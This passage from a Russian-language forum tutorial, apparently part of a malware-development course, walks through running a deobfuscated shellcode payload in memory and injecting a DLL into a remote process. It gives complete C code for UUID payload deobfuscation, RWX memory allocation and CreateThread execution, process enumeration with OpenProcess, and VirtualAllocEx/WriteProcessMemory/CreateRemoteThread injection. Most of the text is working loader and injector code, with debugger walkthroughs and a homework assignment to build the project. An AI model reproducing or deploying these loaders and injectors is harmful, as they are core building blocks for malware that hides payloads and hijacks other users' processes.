Выполнение shellcode с использованием нового потока без короткой задержки увеличивает вероятность завершения выполнения основного потока до завершения выполнения рабочего потока, который выполняет shellcode, что приводит к неправильной работе shellcode. Этот сценарий иллюстрируется в приведенном ниже фрагменте кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main(){

    // ...

    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Выполнение shellcode
    return 0; // Основной поток завершен до выполнения потока, который выполняет shellcode
}</code></pre>
	</div>
</div><br />
В предоставленной реализации используется getchar(), чтобы приостановить выполнение до тех пор, пока пользователь не предоставит ввод. В реальных реализациях следует использовать другой подход, который использует Windows API WaitForSingleObject для ожидания указанного времени до выполнения потока.<br />
<br />
Приведенный ниже фрагмент кода использует WaitForSingleObject для ожидания завершения выполнения только что созданного потока в течение 2000 миллисекунд перед выполнением оставшегося кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// Оставшийся код</code></pre>
	</div>
</div><br />
В приведенном ниже примере WaitForSingleObject будет ждать вечно завершения выполнения нового потока.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);</code></pre>
	</div>
</div><br />
<b>Основная функция</b><br />
<br />
Основная функция использует UuidDeobfuscation для деобфускации полезной нагрузки, затем выделяет память, копирует shellcode в регион памяти и выполняет его.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf(&quot;[i] Injecting Shellcode The Local Process Of Pid: %d \n&quot;, GetCurrentProcessId());
    printf(&quot;[#] Press &lt;Enter&gt; To Decrypt ... &quot;);
    getchar();

    printf(&quot;[i] Decrypting ...&quot;);
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &amp;pDeobfuscatedPayload, &amp;sDeobfuscatedSize)) {
        return -1;
    }
    printf(&quot;[+] DONE !\n&quot;);
    printf(&quot;[i] Deobfuscated Payload At : 0x%p Of Size : %d \n&quot;, pDeobfuscatedPayload, sDeobfuscatedSize);

    printf(&quot;[#] Press &lt;Enter&gt; To Allocate ... &quot;);
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);

    printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, &#039;\0&#039;, sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>Освобождение памяти</b><br />
<br />
VirtualFree - это WinAPI, который используется для освобождения ранее выделенной памяти. Эта функция должна быть вызвана только после того, как выполнение полезной нагрузки полностью завершено, иначе это может освободить содержимое полезной нагрузки и вызвать сбой процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);</code></pre>
	</div>
</div><br />
<b>Отладка</b><br />
<br />
В этом разделе реализация отлаживается с использованием отладчика xdbg для более глубокого понимания того, что происходит &quot;под капотом&quot;.<br />
<br />
Сначала проверьте вывод функции UuidDeobfuscation, чтобы убедиться, что возвращается действительный shellcode.<br />
<br />
Изображение ниже показывает, что shellcode успешно деобфусцирован.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779143066.png"
		data-src="https://osint42.org/attachments/1746779143066-png.88/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779143066-png.88/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779143066.png"
			title="1746779143066.png"
			width="1315" height="766" loading="lazy" />
	</div><br />
<br />
Следующим шагом является проверка того, что память выделяется с использованием Windows API VirtualAlloc. Опять же, глядя на карту памяти в нижнем левом углу, можно видеть, что память была выделена и заполнена нулями.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779149409.png"
		data-src="https://osint42.org/attachments/1746779149409-png.89/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779149409-png.89/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779149409.png"
			title="1746779149409.png"
			width="1282" height="772" loading="lazy" />
	</div><br />
<br />
<br />
После успешного выделения памяти деобфусцированная полезная нагрузка записывается в буфер памяти.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779155732.png"
		data-src="https://osint42.org/attachments/1746779155732-png.90/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779155732-png.90/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779155732.png"
			title="1746779155732.png"
			width="1560" height="843" loading="lazy" />
	</div><br />
<br />
Вспомните, что pDeobfuscatedPayload был обнулен, чтобы избежать наличия деобфусцированной полезной нагрузки в памяти там, где она не используется. Буфер должен быть полностью обнулен.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779162585.png"
		data-src="https://osint42.org/attachments/1746779162585-png.91/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779162585-png.91/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779162585.png"
			title="1746779162585.png"
			width="1393" height="614" loading="lazy" />
	</div><br />
<br />
И, наконец, shellcode выполняется, и, как ожидалось, появляется приложение калькулятора.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779168989.png"
		data-src="https://osint42.org/attachments/1746779168989-png.92/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779168989-png.92/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779168989.png"
			title="1746779168989.png"
			width="1815" height="806" loading="lazy" />
	</div><br />
<br />
<br />
Shellcode можно увидеть на вкладке памяти в Process Hacker.<br />
Обратите внимание на то, что выделенный регион памяти имеет защиту памяти RWX, он выделяется в рантайме <b><u>и, следовательно, обычно является индикатором вредоносного ПО.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779183511.png"
		data-src="https://osint42.org/attachments/1746779183511-png.93/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779183511-png.93/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779183511.png"
			title="1746779183511.png"
			width="1202" height="683" loading="lazy" />
	</div></div>
						

							<h2>Иньекция в процесс</h2>

							

							

							<div class="bbWrapper">В этой статье предлагаю обсудить метод, аналогичный тому, что был показан ранее при локальной инъекции DLL, за исключением того, что теперь инъекция будет выполняться в удаленный процесс.<br />
<br />
<b>Перечисление процессов</b><br />
<br />
Прежде чем можно будет инъецировать DLL в процесс, необходимо выбрать целевой процесс. Поэтому первым шагом в инъекции в удаленный процесс обычно является перечисление запущенных процессов на компьютере для определения потенциальных целевых процессов, в которые можно выполнить инъекцию. Для этого требуется идентификатор процесса (PID), чтобы открыть дескриптор целевого процесса и выполнить необходимую работу в нем.<br />
<br />
В статье мы создадим функцию, которая выполняет перечисление процессов для определения всех запущенных процессов.<br />
Функция GetRemoteProcessHandle будет использоваться для перечисления всех запущенных процессов в системе, открытия дескриптора целевого процесса и возврата как PID, так и дескриптора процесса.<br />
<br />
<b>CreateToolhelp32Snapshot</b><br />
<br />
Кодовый фрагмент начинается с использования функции CreateToolhelp32Snapshot с флагом TH32CS_SNAPPROCESS в качестве первого параметра, который создает снимок всех процессов, работающих в системе в момент выполнения функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Создает снимок всех в данный момент выполняющихся процессов
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);</code></pre>
	</div>
</div><br />
<b>Структура PROCESSENTRY32</b><br />
<br />
После создания снимка функция Process32First используется для получения информации о первом процессе в снимке. Для всех остальных процессов в снимке используется функция Process32Next.<br />
<br />
Документация Microsoft утверждает, что как Process32First, так и Process32Next требуют передачи структуры PROCESSENTRY32 в качестве второго параметра. После вызова функций эти функции заполняют структуру информацией о процессе.<br />
<br />
Структура PROCESSENTRY32 показана ниже с комментариями рядом к полезным членам структуры, которые будут заполнены этими функциями.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // Идентификатор процесса
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // Идентификатор родительского процесса
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // Имя исполняемого файла процесса
} PROCESSENTRY32;</code></pre>
	</div>
</div><br />
После вызова Process32First или Process32Next и заполнения структуры, данные можно извлечь из структуры, используя оператор точки.<br />
Например, чтобы извлечь PID, используйте PROCESSENTRY32.th32ProcessID.<br />
<br />
<b>Process32First и Process32Next</b><br />
<br />
Как уже упоминалось, Process32First используется для получения информации о первом процессе, а Process32Next для всех остальных процессов в снимке с использованием цикла do-while. Имя процесса, которое ищется (szProcessName), сравнивается с именем процесса в текущей итерации цикла, которое извлекается из заполненной структуры Proc.szExeFile. Если есть совпадение, то сохраняется идентификатор процесса (PID), и открывается дескриптор для этого процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Получение информации о первом процессе в снимке.
if (!Process32First(hSnapShot, &amp;Proc)) {
    printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
    goto _EndOfFunction;
}

do {
    // Используйте оператор точки для извлечения имени процесса из заполненной структуры
    // Если имя процесса совпадает с тем, что мы ищем
    if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
        // Используйте оператор точки для извлечения идентификатора процесса из заполненной структуры
        // Сохраните PID
        *dwProcessId  = Proc.th32ProcessID;
        // Откройте дескриптор процесса
        *hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        if (*hProcess == NULL)
            printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

        break; // Выход из цикла
    }

// Получение информации о следующем процессе в снимке.
// Пока в снимке еще остается процесс, продолжайте цикл
} while (Process32Next(hSnapShot, &amp;Proc));</code></pre>
	</div>
</div><br />
<b>Пример кода получения ID и хендла процесса по имени:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    // Согласно документации:
    // Перед вызовом функции Process32First установите этот член в sizeof(PROCESSENTRY32).
    // Если dwSize не инициализирован, Process32First завершится неудачей.
    PROCESSENTRY32    Proc = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    HANDLE hSnapShot = NULL;

    // Создает снимок всех в данный момент выполняющихся процессов
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // Получение информации о первом процессе в снимке.
    if (!Process32First(hSnapShot, &amp;Proc)) {
        printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // Используйте оператор точки для извлечения имени процесса из заполненной структуры
        // Если имя процесса совпадает с тем, что мы ищем
        if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
            // Используйте оператор точки для извлечения идентификатора процесса из заполненной структуры
            // Сохраните PID
            *dwProcessId = Proc.th32ProcessID;
            // Откройте дескриптор процесса
            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

            break; // Выход из цикла
        }

    // Получение информации о следующем процессе в снимке.
    // Пока в снимке еще остается процесс, продолжайте цикл
    } while (Process32Next(hSnapShot, &amp;Proc));

    // Очистка ресурсов
    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);
        if (*dwProcessId == NULL || *hProcess == NULL)
            return FALSE;
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Чувствительность к регистру в имени процесса</b><br />
<br />
Приведенный выше кодовый фрагмент содержит один недочет, который был упущен и который может привести к неверным результатам. Функция wcscmp использовалась для сравнения имен процессов, но при этом не учитывалась чувствительность к регистру, что означает, что Process1.exe и process1.exe будут считаться двумя разными процессами.<br />
<br />
В приведенном ниже кодовом фрагменте этот недостаток устранен путем преобразования значения в члене Proc.szExeFile в строку в нижнем регистре, а затем сравнения его со szProcessName.<br />
Таким образом, szProcessName всегда должен передаваться в виде строки в нижнем регистре.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    // Согласно документации:
    // Перед вызовом функции Process32First установите этот член в sizeof(PROCESSENTRY32).
    // Если dwSize не инициализирован, Process32First завершится неудачей.
    PROCESSENTRY32    Proc = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    HANDLE hSnapShot = NULL;

    // Создает снимок всех в данный момент выполняющихся процессов
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // Получение информации о первом процессе в снимке.
    if (!Process32First(hSnapShot, &amp;Proc)) {
        printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD    dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            // Преобразование каждого символа в Proc.szExeFile в символ нижнего регистра
            // и сохранение его в LowerName
            if (dwSize &lt; MAX_PATH * 2) {
                for (; i &lt; dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = &#039;\0&#039;;
            }
        }

        // Если преобразованное в нижний регистр имя процесса совпадает с искомым процессом
        if (wcscmp(LowerName, szProcessName) == 0) {
            // Сохраните PID
            *dwProcessId = Proc.th32ProcessID;
            // Откройте дескриптор процесса
            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // Получение информации о следующем процессе в снимке.
    // Пока в снимке еще остается процесс, продолжайте цикл
    } while (Process32Next(hSnapShot, &amp;Proc));

    // Очистка ресурсов
    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);
        if (*dwProcessId == NULL || *hProcess == NULL)
            return FALSE;
        return TRUE;
    }</code></pre>
	</div>
</div><br />
<b>Инъекция DLL</b><br />
<br />
Дескриптор процесса целевого процесса был успешно получен. Следующим шагом будет инъекция DLL в целевой процесс, для которого потребуется использование нескольких ранее использованных Windows API, а также некоторых новых.<br />
<br />
VirtualAllocEx - Аналогично VirtualAlloc, за исключением того, что он позволяет выделять память в удаленном процессе.<br />
<br />
WriteProcessMemory - Записывает данные в удаленный процесс. В этом случае он будет использоваться для записи пути к DLL в целевой процесс.<br />
<br />
CreateRemoteThread - Создает поток в удаленном процессе.<br />
<br />
<b>Обзор кода</b><br />
<br />
В этом разделе будет рассмотрен код инъекции DLL (показан ниже). Функция InjectDllToRemoteProcess принимает два аргумента:<br />
<br />
Дескриптор процесса - это HANDLE к целевому процессу, в который будет инъецирован DLL.<br />
Имя DLL - полный путь к DLL, который будет инъецирован в целевой процесс.<br />
<br />
<b>Определение адреса LoadLibraryW</b><br />
<br />
LoadLibraryW используется для загрузки DLL в процесс, который его вызывает. Поскольку целью является загрузка DLL в удаленный процесс, а не в локальный процесс, он не может быть вызван напрямую.<br />
<br />
Вместо этого необходимо получить адрес LoadLibraryW и передать его созданному удаленному потоку в процессе, передавая имя DLL в качестве его аргумента.<br />
Это работает, потому что адрес WinAPI LoadLibraryW будет таким же в удаленном процессе, как и в локальном процессе. Чтобы определить адрес WinAPI, используются GetProcAddress и GetModuleHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// LoadLibrary экспортируется kernel32.dll
// Поэтому получен дескриптор kernel32.dll, а затем адрес LoadLibraryW
pLoadLibraryW = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</code></pre>
	</div>
</div><br />
Адрес, хранящийся в pLoadLibraryW, будет использоваться в качестве точки входа потока при создании нового потока в удаленном процессе.<br />
<br />
<b>Выделение памяти</b><br />
<br />
Следующим шагом является выделение памяти в удаленном процессе, которое может вместить имя DLL, DllName. Для выделения памяти в удаленном процессе используется функция VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Выделяет память размером dwSizeToWrite (это размер имени dll) внутри удаленного процесса, hProcess.
// Защита памяти - Чтение-Запись
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</code></pre>
	</div>
</div><br />
<b>Запись в выделенную память</b><br />
<br />
После успешного выделения памяти в удаленном процессе можно использовать WriteProcessMemory для записи в выделенный буфер. Имя DLL записывается в ранее выделенный буфер памяти.<br />
<br />
Функция WinAPI WriteProcessMemory выглядит следующим образом на основе ее документации:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // Дескриптор процесса, память которого будет записана
  [in]  LPVOID  lpBaseAddress,          // Базовый адрес в указанном процессе, в который будут записаны данные
  [in]  LPCVOID lpBuffer,               // Указатель на буфер, содержащий данные для записи в &#039;lpBaseAddress&#039;
  [in]  SIZE_T  nSize,                  // Количество байт, которые будут записаны в указанный процесс.
  [out] SIZE_T  *lpNumberOfBytesWritten // Указатель на переменную &#039;SIZE_T&#039;, которая получает количество фактически записанных байтов
);</code></pre>
	</div>
</div><br />
На основе показанных выше параметров WriteProcessMemory, его можно вызвать следующим образом, записывая буфер (DllName) в выделенный адрес (pAddress), возвращенный ранее вызванной функцией VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Записанные данные - это имя DLL, &#039;DllName&#039;, размером &#039;dwSizeToWrite&#039;
SIZE_T lpNumberOfBytesWritten = NULL;
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)</code></pre>
	</div>
</div><br />
<b>Выполнение через новый поток</b><br />
<br />
После успешной записи пути к DLL в выделенный буфер будет использоваться CreateRemoteThread для создания нового потока в удаленном процессе.<br />
Здесь становится необходимым адрес LoadLibraryW.<br />
pLoadLibraryW передается в качестве начального адреса потока, затем pAddress, содержащий имя DLL, передается в качестве аргумента вызова LoadLibraryW. Это делается путем передачи pAddress в качестве параметра lpParameter функции CreateRemoteThread.<br />
<br />
Параметры CreateRemoteThread такие же, как у функции CreateThread, описанной ранее, за исключением дополнительного параметра HANDLE hProcess, который представляет собой дескриптор процесса, в котором будет создан поток.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Точка входа потока будет &#039;pLoadLibraryW&#039;, который является адресом LoadLibraryW
// Имя DLL, pAddress, передается в качестве аргумента для LoadLibrary
HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);</code></pre>
	</div>
</div><br />
<b>Инъекция DLL - Поный код функции InjectDllToRemoteProcess</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

    BOOL        bSTATE                    = TRUE;

    LPVOID        pLoadLibraryW             = NULL;
    LPVOID        pAddress                  = NULL;

    // получение размера DllName *в байтах* (для записи в память процесса)
    DWORD        dwSizeToWrite             = (wcslen(DllName) + 1) * sizeof(WCHAR);

    // Получение адреса LoadLibraryW
    pLoadLibraryW = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);
    if (pLoadLibraryW == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Выделение памяти в удаленном процессе
    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Запись DllName в выделенный регион памяти
    SIZE_T lpNumberOfBytesWritten = NULL;
    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)) {
        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Создание нового потока для загрузки Dll
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
    if (hThread == NULL) {
        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Ожидание завершения потока
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Освобождение выделенной памяти
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);

    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>Отладка (В качестве домашнего задания напишите проект сами и проделайте сами описанное ниже)</b><br />
<br />
В этом разделе реализация отлаживается с использованием отладчика xdbg, чтобы лучше понять, что происходит &quot;под капотом&quot;.<br />
<br />
Сначала запустите RemoteDllInjection.exe и передайте два аргумента: целевой процесс и полный путь к DLL, который нужно внедрить в целевой процесс.<br />
<br />
В этой демонстрации внедряется notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779423138.png"
		data-src="https://osint42.org/attachments/1746779423138-png.94/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779423138-png.94/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779423138.png"
			title="1746779423138.png"
			width="1378" height="272" loading="lazy" />
	</div><br />
<br />
Процесс перечисления успешно выполнен. Проверьте, что PID Notepad действительно равен 20932, используя Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779430972.png"
		data-src="https://osint42.org/attachments/1746779430972-png.95/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779430972-png.95/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779430972.png"
			title="1746779430972.png"
			width="1183" height="175" loading="lazy" />
	</div><br />
<br />
Далее, к целевому процессу, Блокноту, присоединяется xdbg, и проверяется выделенный адрес. Изображение ниже показывает, что буфер был успешно выделен.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779439202.png"
		data-src="https://osint42.org/attachments/1746779439202-png.96/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779439202-png.96/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779439202.png"
			title="1746779439202.png"
			width="1558" height="663" loading="lazy" />
	</div><br />
<br />
После выделения памяти имя DLL записывается в буфер.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779449639.png"
		data-src="https://osint42.org/attachments/1746779449639-png.97/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779449639-png.97/index.html"
			data-url=""
